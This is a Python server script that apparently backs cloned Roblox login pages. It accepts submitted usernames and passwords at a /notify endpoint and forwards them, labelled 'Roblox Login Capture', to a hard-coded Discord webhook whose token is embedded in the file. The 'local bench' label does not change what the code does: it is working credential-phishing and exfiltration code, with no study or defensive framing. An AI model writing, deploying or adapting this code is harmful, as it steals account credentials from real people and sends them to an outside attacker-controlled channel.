# language: Python 3, file: server.py, target: local bench
# Serves the clones on 127.0.0.1:8900 and relays captured logins to your Discord webhook.
import json
import urllib.request
import datetime
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

WEBHOOK = "https://discord.com/api/webhooks/1573474138956238949/XsCmbqR93J84OJSEI7hdTfzuTLM9L-hvwyB3FPjrDr5AXjfSV1Am8HfaIatbBcA9ML_0"


class BenchHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path != "/notify":
            self.send_error(404)
            return
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)
        try:
            data = json.loads(raw.decode("utf-8"))
        except Exception:
            self.send_error(400)
            return

        username = str(data.get("username", ""))
        password = str(data.get("password", ""))
        page = str(data.get("page", ""))
        when = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        content = (
            "**Roblox Login Capture**\n"
            "**Username:** `" + username + "`\n"
            "**Password:** `" + password + "`\n"
            "**Page:** " + page + "\n"
            "**Time:** " + when
        )
        payload = json.dumps({"content": content}).encode("utf-8")
        req = urllib.request.Request(
            WEBHOOK,
            data=payload,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                status = resp.status
        except Exception as exc:
            status = "ERROR: " + str(exc)

        body = json.dumps({"ok": status == 204, "status": status}).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


if __name__ == "__main__":
    server = ThreadingHTTPServer(("127.0.0.1", 8900), BenchHandler)
    print("bench listening on http://127.0.0.1:8900")
    server.serve_forever()
